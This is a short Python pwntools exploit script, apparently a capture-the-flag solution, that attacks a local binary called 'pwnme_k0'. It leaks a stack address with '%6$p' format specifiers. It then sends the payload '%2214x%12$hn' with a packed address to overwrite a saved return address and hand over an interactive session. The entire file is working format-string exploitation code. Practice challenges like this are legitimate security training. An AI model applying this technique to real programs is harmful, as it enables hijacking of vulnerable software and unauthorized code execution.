from pwn import *
context.log_level = 'debug'
elf=ELF('./pwnme_k0')
p=process('./pwnme_k0')
# ~ gdb.attach(p,'break *0x400B39')
p.recvuntil('Input your username(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('Input your password(max lenth:20):')
p.sendline('%6$p')
p.recvuntil('>')
p.sendline('1')
# ~ data=p.recvuntil('>')
# ~ data=data.split('\n')[1]
# ~ p.recvuntil('\n')

# ~ print 'p.recv(): ' + p.recv()
data = int(p.recv(14),16)

print 'data: ' + hex(data)
leak_addr = data -0x38
# ~ leak_addr=int(data,16)-0x38
# ~ print hex(leak_addr)
p.sendline('2')
p.recvuntil('please input new username(max lenth:20):')
p.sendline('b'*8)
p.recvuntil('please input new password(max lenth:20):')
payload = "%2214x%12$hn"
payload += p64(leak_addr)
p.send(payload)
# ~ pause()
p.recvuntil('>')
p.sendline('1')
p.interactive()
